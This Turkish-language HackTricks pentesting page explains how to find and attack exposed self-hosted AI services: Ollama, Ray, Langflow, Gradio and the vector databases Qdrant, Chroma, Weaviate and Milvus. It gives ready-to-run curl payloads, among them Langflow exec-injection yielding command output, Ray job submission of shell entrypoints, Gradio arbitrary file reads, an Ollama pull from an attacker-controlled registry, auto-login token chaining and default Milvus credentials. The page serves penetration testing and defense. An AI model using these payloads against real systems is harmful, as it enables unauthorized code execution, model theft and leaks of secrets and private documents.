# Açığa Çıkmış Self-Hosted AI Hizmetleri

{{#include ../banners/hacktricks-training.md}}

AI özellikleri geliştiren ekipler genellikle kendi model çalıştırıcılarını, agent oluşturucularını, demo arayüzlerini, compute kümelerini ve vector database'lerini çalıştırır. Bu araçların çoğu bir dizüstü bilgisayar veya kapalı bir laboratuvar ağı için tasarlanmıştır; bu nedenle **varsayılan olarak kimlik doğrulaması yoktur** ya da kimlik doğrulamasını atlayan bir ayar etkin olarak gelir. Böyle bir hizmet saldırgan tarafından erişilebilir olduğunda, etki genellikle şu gruplardan birine girer:

- GPU'ların ve modellerin ücretsiz kullanımı, özel modellerin çalınması.
- Prompt'ların, belgelerin ve embedding'lerin sızması.
- İşlem ortamındaki gizli bilgilerin sızması (LLM sağlayıcı anahtarları, cloud kimlik bilgileri).
- Code execution; çünkü bu API'lerden bazıları kod çalıştırmayı **özellik olarak** sunar.

Bu sayfada bu hizmetlerin nasıl bulunacağı ve her API türünde nelerin test edileceği açıklanır. Self-hosted inference server'ı güçlendirme ve llama.cpp `/slots` leak'i hakkında bilgi için [AI Risk Frameworks](AI-Risk-Frameworks.md#self-hosted-llm-inference-hardening) sayfasına bakın. Kötü amaçlı model dosyaları için [AI Models RCE](AI-Models-RCE.md) sayfasına bakın.

## Parmak izi alma

Bu istekleri kimlik bilgisi olmadan gönderin. Beklenen alanları içeren bir JSON yanıtı ürünü ve genellikle sürümünü tanımlar; bu da aşağıdaki kontrollerden hangilerinin geçerli olduğunu gösterir. Portlar, belgelenmiş varsayılanlar veya resmi çalıştırma örneklerinde kullanılan portlardır.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

| Ürün | Yaygın port | Kimlik doğrulaması gerektirmeyen istek | Ürünü tanımlayan özellik |
| --- | --- | --- | --- |
| Ollama | 11434 | `GET /api/version`, `GET /api/tags` | Sürüm JSON'u, yerel modellerin listesi |
| Langflow | 7860 | `GET /api/v1/version` | Langflow sürüm JSON'u |
| Gradio | 7860 | `GET /config` | Gradio sürümünü ve bileşen kimliklerini içeren uygulama yapılandırması |
| Ray dashboard | 8265 | `GET /api/version`, `GET /api/jobs/` | `ray_version`, gönderilen işlerin listesi |
| Chroma | 8000 | `GET /api/v2/heartbeat`, `GET /api/v2/version` | Heartbeat değeri, Chroma sürümü |
| Qdrant | 6333 | `GET /`, `GET /collections` | Qdrant sürümü, collection listesi |
| Weaviate | - | `GET /v1/meta`, `GET /v1/schema` | Weaviate sürümü, sınıflar |
| Milvus | 19530 | `POST /v2/vectordb/collections/list` | Collection listesi veya kimlik doğrulama hatası |

Bu hizmetler genellikle ters proxy arkasında bir yol önekiyle de yayımlanır (örneğin `/ollama/` veya `/ray/`); bu nedenle JavaScript bundle'larında veya API belgelerinde bulduğunuz tüm önekleri kullanarak istekleri yineleyin.

## Kimlik doğrulaması gerektirmeyen inference ve model yönetimi API'leri

Model çalıştırıcıları genellikle inference rotalarıyla yönetim rotalarını bir araya getiren tek bir REST API sunar. Ollama buna iyi bir örnektir. Yerleşik kimlik doğrulaması yoktur ve varsayılan olarak `127.0.0.1:11434` adresine bağlanır; `OLLAMA_HOST` ise bağlanılacak adresi değiştirir.<sup>[[1]](#references)[[15]](#references)</sup> Resmi Docker image'ı container içinde `OLLAMA_HOST=0.0.0.0:11434` ayarlar, `EXPOSE 11434` tanımlar ve `USER` talimatı içermez; dolayısıyla server container içinde root olarak çalışır.<sup>[[16]](#references)</sup> `EXPOSE` portu host'ta yayımlamaz; bu nedenle host üzerinden erişilebilirlik dağıtıma bağlıdır. Belgelenmiş `docker run` komutları `-p 11434:11434` kullanır ve Docker, host IP'si belirtilmediği sürece bu tür bir eşlemeyi tüm host arayüzlerinde yayımlar.<sup>[[17]](#references)[[18]](#references)</sup>

Her rota grubunun saldırgana sağladıkları:<sup>[[2]](#references)</sup>

| Rotalar | Kimlik doğrulaması olmadığında etki |
| --- | --- |
| `GET /api/tags`, `GET /api/ps` | Özel custom modeller de dahil olmak üzere yerel ve yüklenmiş modellerin listesi |
| `POST /api/show` | Modelfile, template ve **system prompt** dahil model ayrıntıları |
| `POST /api/generate`, `/api/chat`, `/api/embed` | Kurbanın donanımında ücretsiz inference |
| `POST /api/pull`, `/api/push` | Server'ın saldırganın seçtiği bir registry'den model indirmesini veya oraya model yüklemesini sağlama |
| `POST /api/create`, `/api/copy`, `DELETE /api/delete` | Model oluşturma, üzerine yazma veya silme |

```bash
curl -s http://target:11434/api/tags
curl -s http://target:11434/api/show -d '{"model":"<name from /api/tags>"}'
# Outbound fetch to a registry you control: only look for the callback
curl -s http://target:11434/api/pull -d '{"model":"<your-host>/library/test:latest","insecure":true}'
```

Kimlik bilgileri olmadan döndürülen bir model listesi, maruziyeti zaten kanıtlar. Özel modeller genellikle `/api/show` içinde dahili bir system prompt barındırır. Sunucunun saldırganın seçtiği registry'lerden manifest çektiğini, kendi host'unuza yapılan bir pull kanıtlar. `/api/push` ile registry'nize yapılan bir push, maruziyeti model hırsızlığına dönüştürür. Gerçek hedeflerde create veya delete route'larını çağırmayın.

Registry pull'ları aynı zamanda bir parser attack surface oluşturur; çünkü sunucu blob'ları uzak manifestteki değerleri kullanarak depolar. Probllama'da (CVE-2024-37032, Ollama 0.1.34'te giderildi) manifestteki `digest`, doğrulanmadan dosya adı olarak kullanılıyordu. Bu nedenle kötü amaçlı bir registry, `../` dizileriyle blobs dizininin dışına dosya yazabiliyordu. Digest'i yerel bir dosyayı gösterecek şekilde ayarlanmış, önceden hazırlanmış bir manifesti push etmek bu dosyayı saldırganın registry'sine sızdırıyordu. Wiz, sunucunun root olarak çalıştığı Docker'da bir shared library yazarak ve bunu `/etc/ld.so.preload` dosyasına ekleyerek, ardından yeni bir process'in bu library'yi yüklemesi için `/api/chat` çağrısı yaparak RCE elde etti.<sup>[[15]](#references)</sup> Bir runner herhangi bir registry'den pull yapabiliyorsa, manifest alanlarını nasıl yola dönüştürdüğünü kontrol edin.

## Tasarım gereği kod çalıştıran API'ler

İlgili: [Flowise istek başına workflow-code override'ları](../pentesting-web/server-side-javascript-injection.md#per-request-workflow-code-overrides-flowise).

### İş gönderme API'leri

Dağıtık compute framework'leri, kod çalıştırmayı temel özellikleri olarak görür. Dashboard portundaki (8265) Ray Jobs API, `entrypoint` shell komutunu kabul eder ve bunu cluster üzerinde çalıştırır.<sup>[[19]](#references)</sup> Oligo'nun ShadowRay araştırması, Jobs API'nin authorization gerektirmediğini ve dashboard'un `0.0.0.0` adresine bağlandığını bildiriyor. Eşleşen CVE-2023-48022 tartışmalıdır; çünkü Ray yalnızca kontrollü bir ağ içinde çalıştırılmayı bekler.<sup>[[20]](#references)</sup> Ray, 2.52.0 sürümünde isteğe bağlı token authentication (`RAY_AUTH_MODE=token`) ekledi. Ray 2.59, `ray.init()` ile başlatılan yerel cluster'lar için bunu varsayılan olarak etkinleştirir; kullanılabilir bir token olmadan `ray start --head` hâlâ kimlik doğrulamasız başlatılabilir. Ray, varsayılan authentication'ın daha geniş kapsamlı olarak 2.61'de devreye alınacağını belgeliyor; bu nedenle dashboard'un açık olduğunu varsaymak yerine dağıtılan sürümü ve başlatma modunu kontrol edin.<sup>[[21]](#references)</sup>

```bash
curl -s http://target:8265/api/version
curl -s http://target:8265/api/jobs/   # existing entrypoints often contain secrets
# Only if the scope allows code execution: DNS callback as proof
curl -s -X POST http://target:8265/api/jobs/ -H 'Content-Type: application/json' \
  -d '{"entrypoint":"nslookup <oast-host>","runtime_env":{}}'
```

Bu tür panolarda eski sürümlerde yoklamaya değer yardımcı rotalar da bulunur. Ray 2.8.1'den önce `/log_proxy?url=` herhangi bir HTTP(S) URL'sini getiriyordu (bulut metadata'sına SSRF) ve `/api/v0/logs/file`, ikisi de kimlik doğrulaması olmadan, rastgele bir `filename` yolu kabul ediyordu.<sup>[[8]](#references)</sup>

### Fonksiyon tanımlarını çalıştıran Code "doğrulama" uç noktaları

Özel Python bileşenlerini kabul eden ajan oluşturucular, bazen kodu `ast` ile ayrıştırıp yalnızca fonksiyon tanımlarını `exec()` ile çalıştırarak kodu "doğrular". Bu güvenli değildir. Python, fonksiyonu tanımlarken **decorator'ları ve varsayılan argüman değerlerini değerlendirir**; bu nedenle fonksiyon gövdesi hiç çalıştırılmasa bile buralara yerleştirilen kod çalışır. Langflow'un `POST /api/v1/validate/code` uç noktası bu şekilde çalışıyordu ve 1.3.0'dan önce kimlik doğrulaması gerektirmiyordu (CVE-2025-3248). Komut çıktısını içeren bir istisna fırlatmak, uç noktanın çıktıyı yanıtta döndürmesini sağlar:<sup>[[22]](#references)</sup>

```bash
# Decorator variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code": "@exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")\ndef foo():\n  pass"}'
# Default-argument variant
curl -s -X POST -H 'Content-Type: application/json' http://target:7860/api/v1/validate/code \
  -d '{"code":"def foo(cmd=exec(\"raise Exception(__import__(\\\"subprocess\\\").check_output(\\\"id\\\"))\")):\n  pass"}'
```

Bu pattern için kullanıcı kodunu derleyen, lint denetiminden geçiren veya "kontrol eden" tüm endpoint'leri test edin ve kanıt olarak tercihen bir DNS callback kullanın.

### Otomatik giriş ve varsayılan superuser token rotaları

Tek kullanıcılı araçlar genellikle her ziyaretçiyi yönetici olarak oturum açtıran bir kestirme yol sunar. Langflow'da `AUTO_LOGIN` etkin olduğunda, `GET /api/v1/auto_login` herhangi bir çağırana varsayılan superuser için token'lar döndürür. Devre dışı olduğunda rota `Auto login is disabled.` yanıtını verir.<sup>[[23]](#references)</sup> Langflow OSS 1.0.0 ile 1.10.0 arasında varsayılan olarak etkin durumdaydı (CVE-2026-9103). Yukarıdaki kimlik doğrulaması gerektiren kod doğrulama rotasıyla zincirleme kullanılması, kimlik doğrulaması gerektirmeyen RCE'yi yeniden mümkün kılar (CVE-2026-9198, Harish Kolla tarafından bildirildi).<sup>[[24]](#references)[[25]](#references)[[33]](#references)</sup> Mevcut resmi sürüm paketleri ve Docker imajları otomatik girişi devre dışı bırakır ve bir superuser parolası gerektirir; ancak geliştirme dallarında bu özellik etkin kalır.<sup>[[3]](#references)</sup>

```bash
TOKEN=$(curl -s http://target:7860/api/v1/auto_login | jq -r .access_token)
curl -s -H "Authorization: Bearer $TOKEN" http://target:7860/api/v1/users/whoami
```

Kod yürütme olmasa bile, bir superuser token tüm flow'lara ve kayıtlı provider kimlik bilgilerine erişim sağlar. Otomatik testlerde ilgili bir ön koşul denetimi için bkz. [Web Black-Box AI Pentester Bots](Web-Black-Box-AI-Pentester-Bots.md).

## ML demo arayüzlerindeki dosya sunma ve RPC rotaları

ML demo framework'leri, yüklenen ve oluşturulan dosyaları genel bir rota üzerinden sunar ve frontend'in sunucu tarafındaki bileşen yardımcılarını çağırmasına izin verir. Gradio bunun için `/config`, `/upload` ve `/file=<path>` rotalarını sunar.<sup>[[5]](#references)</sup> Benzer framework'lerde test etmeye değer iki kalıp:

- **Bir upload alt dizininden traversal:** Dosya rotası yalnızca yolun geçici klasör içinde başladığını denetliyorsa bir alt dizin oluşturmak için dosya yükleyin, ardından `../` veya `%2e%2e%2f` ile bu dizinin dışına çıkın. Gradio 4.0 ile 4.10 arasındaki sürümler (CVE-2023-51449) bu şekilde savunmasızdı.<sup>[[26]](#references)[[27]](#references)</sup> İstemcinin yolu normalize etmesini önlemek için isteği `curl --path-as-is` ile gönderin.
- **Keyfi method dispatch:** Kullanıcı girdisiyle `getattr(component, fn_name)` çağıran bir endpoint, saldırganın dahili yardımcıları çağırmasına olanak tanır. 4.13.0 öncesinde Gradio'nun `/component_server` rotası bunu yapıyordu. 4.3 ile 4.12 arasındaki sürümlerde `move_resource_to_block_cache`, herhangi bir yerel dosyayı önbelleğe kopyalıyordu; bu dosya `/file=` üzerinden indirilebiliyordu. 3.47 ile 3.50.2 arasındaki sürümlerde diğer yardımcılar dosya okuma ve tam okuma SSRF'si sağlıyordu.<sup>[[26]](#references)[[28]](#references)</sup> Düzeltilmiş bir sunucu, sunucu fonksiyonu olarak işaretlenmemiş yardımcılar için `Function not found.` yanıtını verir.<sup>[[28]](#references)</sup>

```bash
curl -s http://target:7860/config | jq '.components[].id'
curl -s http://target:7860/component_server -H 'Content-Type: application/json' \
  -d '{"component_id":"1","data":"/etc/hostname","fn_name":"move_resource_to_block_cache","session_hash":"aaa"}'
curl -s 'http://target:7860/file=<returned_path>'
```

Hugging Face Spaces'te Space secrets ortam değişkenleridir, bu nedenle `/proc/self/environ` en değerli dosyadır. Horizon3 bu dosyayı bir HTTP `Range` header'ı kullanarak okudu.<sup>[[26]](#references)</sup>

## RAG tarafından kullanılan vector database'ler

RAG, orijinal belgelerin parçalarını, bunların embedding'lerini ve metadata'larını bir vector database'de depolar; assistant da en iyi sonuçları prompt'una ekler. Bu nedenle okuma erişimi, özel belgelerin **düz metnini** leak eder. Yazma erişimi, saldırganın daha sonra diğer kullanıcıların prompt'larına alınan parçaları eklemesine olanak tanır; bu, kalıcı dolaylı prompt injection'dır ([AI Prompts](AI-Prompts.md#third-party-or-indirect-prompt-injection) bölümüne bakın).

Self-hosted vector database'ler için authentication yapılandırılmış mı veya anonymous access etkin mi kontrol edin:

- **Qdrant**: self-deployed instance'lar tüm arayüzleri dinler ve authentication kullanmaz. Yapılandırıldığında anahtar, `api-key` header'ına veya `Authorization: Bearer` olarak eklenir. Salt okunur ve koleksiyon başına anahtarlar bulunabilir.<sup>[[11]](#references)</sup>
- **Chroma**: authentication varsayılan olarak devre dışıdır. Token auth, `Authorization` veya `X-Chroma-Token` kullanır.<sup>[[29]](#references)</sup>
- **Weaviate**: anonymous access etkin olduğunda kimlik bilgileri olmadan yapılan istekler `user: anonymous` olarak authenticated edilir ve bu kullanıcının sahip olduğu izinleri alır.<sup>[[30]](#references)</sup>
- **Milvus**: `common.security.authorizationEnabled` değeri `true` olmadığı sürece authentication kapalıdır. Etkin olduğunda varsayılan `root` kullanıcısının parolası `Milvus`'tur ve token biçimi `username:password` şeklindedir.<sup>[[31]](#references)[[14]](#references)</sup>

Kimlik bilgileri olmadan özel veri içeren bir yanıt alınması, verilerin açığa çıktığını gösterir. Authentication etkinse değiştirilmemiş varsayılan hesapları ayrıca değerlendirin:<sup>[[12]](#references)[[10]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
curl -s http://target:6333/collections
curl -s -X POST http://target:6333/collections/<name>/points/scroll -H 'Content-Type: application/json' -d '{"limit":3,"with_payload":true}'
curl -s http://target:8000/api/v2/tenants/default_tenant/databases/default_database/collections
curl -s 'http://target:<weaviate-port>/v1/objects?limit=3'
curl -s -X POST http://target:19530/v2/vectordb/collections/list -H 'Authorization: Bearer root:Milvus' -H 'Content-Type: application/json' -d '{}'
```

Payload'ların belge metni, kullanıcı tanımlayıcıları veya tenant adları içerip içermediğini kontrol edin. Üretim verilerini bozmadan yazma erişimini göstermek için, yalnızca kapsam izin veriyorsa, açıkça adlandırılmış boş bir collection oluşturup hemen silin.

Bu sunucularda kimlik doğrulama da çok geç devreye girebilir. Chroma'nın Python FastAPI sunucusunda (1.0.0'dan en az 1.5.8'e kadar, CVE-2026-45829), collection oluşturma route'u, kimlik doğrulama kontrolünden önce istemcinin sağladığı embedding function'ı oluşturuyordu. `trust_remote_code: true` ayarıyla saldırganın kontrolündeki bir Hugging Face modelini referans göstermek, istek reddedilse bile saldırganın kodunu çalıştırıyordu. Rust frontend etkilenmedi.<sup>[[32]](#references)</sup> İstek model veya plugin yapılandırması içeriyorsa, bunu kimlik bilgileri olmadan test edin ve model deponuza dışarıya yönelik bir fetch olup olmadığını izleyin.

## References

- [1] [Ollama SSS](https://github.com/ollama/ollama/blob/main/docs/faq.mdx)
- [2] [Ollama API belgeleri](https://github.com/ollama/ollama/blob/main/docs/api.md)
- [3] [Langflow README](https://github.com/langflow-ai/langflow/blob/main/README.md)
- [4] [Langflow kaynak kodu - API v1 uç noktaları](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/endpoints.py)
- [5] [Gradio kaynak kodu - routes.py](https://github.com/gradio-app/gradio/blob/main/gradio/routes.py)
- [6] [Gradio kaynak kodu - http_server.py](https://github.com/gradio-app/gradio/blob/main/gradio/http_server.py)
- [7] [Ray kaynak kodu - job_head.py](https://github.com/ray-project/ray/blob/master/python/ray/dashboard/modules/job/job_head.py)
- [8] [Bishop Fox - Ray, 2.6.3 ve 2.8.0 sürümleri](https://bishopfox.com/blog/ray-versions-2-6-3-2-8-0)
- [9] [Chroma kaynak kodu - Python istemcisi varsayılanları](https://github.com/chroma-core/chroma/blob/main/chromadb/__init__.py)
- [10] [Chroma kaynak kodu - FastAPI sunucu route'ları](https://github.com/chroma-core/chroma/blob/main/chromadb/server/fastapi/__init__.py)
- [11] [Qdrant - Güvenlik](https://qdrant.tech/documentation/security/)
- [12] [Qdrant OpenAPI belirtimi](https://github.com/qdrant/qdrant/blob/master/docs/redoc/master/openapi.json)
- [13] [Weaviate OpenAPI belirtimi](https://github.com/weaviate/weaviate/blob/main/openapi-specs/schema.json)
- [14] [Milvus - Milvus sunucusuna bağlanma](https://milvus.io/docs/connect-to-milvus-server.md)
- [15] [Wiz - Probllama: Ollama Uzaktan Kod Çalıştırma Güvenlik Açığı (CVE-2024-37032)](https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032)
- [16] [Ollama Dockerfile](https://github.com/ollama/ollama/blob/main/Dockerfile)
- [17] [Ollama Docker belgeleri](https://github.com/ollama/ollama/blob/main/docs/docker.mdx)
- [18] [Docker - Portları yayımlama ve dışa açma](https://docs.docker.com/get-started/docker-concepts/running-containers/publishing-ports/)
- [19] [Ray Jobs REST API](https://docs.ray.io/en/latest/cluster/running-applications/job-submission/rest.html)
- [20] [Oligo - ShadowRay: Gerçek dünyada istismar edilen, AI iş yüklerini hedef alan bilinen ilk saldırı kampanyası](https://www.oligo.security/blog/shadowray-attack-ai-workloads-actively-exploited-in-the-wild)
- [21] [Ray token kimlik doğrulaması](https://docs.ray.io/en/latest/ray-security/token-auth.html)
- [22] [Horizon3.ai - Her Hızda Güvensiz: Langflow AI'da kimlik doğrulamasız RCE için Python Exec'i kötüye kullanma](https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/)
- [23] [Langflow kaynak kodu - login router](https://github.com/langflow-ai/langflow/blob/main/src/backend/base/langflow/api/v1/login.py)
- [24] [NVD - CVE-2026-9103](https://nvd.nist.gov/vuln/detail/CVE-2026-9103)
- [25] [NVD - CVE-2026-9198](https://nvd.nist.gov/vuln/detail/CVE-2026-9198)
- [26] [Horizon3.ai - Gradio'daki dosya okuma güvenlik açıklarından yararlanarak Hugging Face Spaces'ten sırları çalma](https://horizon3.ai/attack-research/disclosures/exploiting-file-read-vulnerabilities-in-gradio-to-steal-secrets-from-hugging-face-spaces/)
- [27] [Gradio güvenlik duyurusu GHSA-6qm2-wpxq-7qh2](https://github.com/gradio-app/gradio/security/advisories/GHSA-6qm2-wpxq-7qh2)
- [28] [Gradio `/component_server` düzeltme commit'i](https://github.com/gradio-app/gradio/commit/24a583688046867ca8b8b02959c441818bdb34a2)
- [29] [Chroma Cookbook - Chroma'ya özgü kimlik doğrulama](https://cookbook.chromadb.dev/security/legacy-auth/)
- [30] [Weaviate - Kimlik doğrulama](https://docs.weaviate.io/weaviate/configuration/authentication)
- [31] [Milvus - Kullanıcı erişimini doğrulama](https://milvus.io/docs/authenticate.md)
- [32] [HiddenLayer - ChromaToast kimlik doğrulama öncesinde sunuldu](https://www.hiddenlayer.com/research/chromatoast-served-pre-auth)
- [33] [IBM Güvenlik Bülteni - Otomatik oturum açma atlatma ve kod doğrulaması yoluyla kimlik doğrulamasız uzaktan kod çalıştırma (CVE-2026-9198)](https://www.ibm.com/support/pages/node/7278927)
